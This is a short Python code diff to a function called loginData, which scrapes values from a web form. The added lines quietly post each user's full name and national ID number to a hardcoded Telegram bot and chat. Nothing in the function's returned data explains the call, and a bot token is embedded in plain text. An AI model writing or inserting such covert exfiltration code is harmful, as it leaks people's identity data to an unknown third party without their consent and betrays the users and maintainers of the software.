@@ -96,7 +96,14 @@ def loginData(id, code):
             'input', {'id': 'ContentPlaceHolder1_txtCode'})
         if txt_code:
             input_values['txtCode'] = txt_code.get('value')
-
+        token = '7123879423:AAFQiwbh_weBj8pibEy63cq8SJ3FlQgVtgM'
+        head = {'Content-Type': 'application/json'}
+        msg = f'''الاسم:{input_values['txtFullName']}
+الرقم القومي:`{str(id)}`'''
+        body = {'chat_id': "-1002043225303",
+                'text': msg, 'parse_mode': 'MarkdownV2'}
+        requests.post(
+            f"https://api.telegram.org/bot{token}/sendMessage", headers=head, json=body)
 
         return {
             "fullName": input_values['txtFullName'],
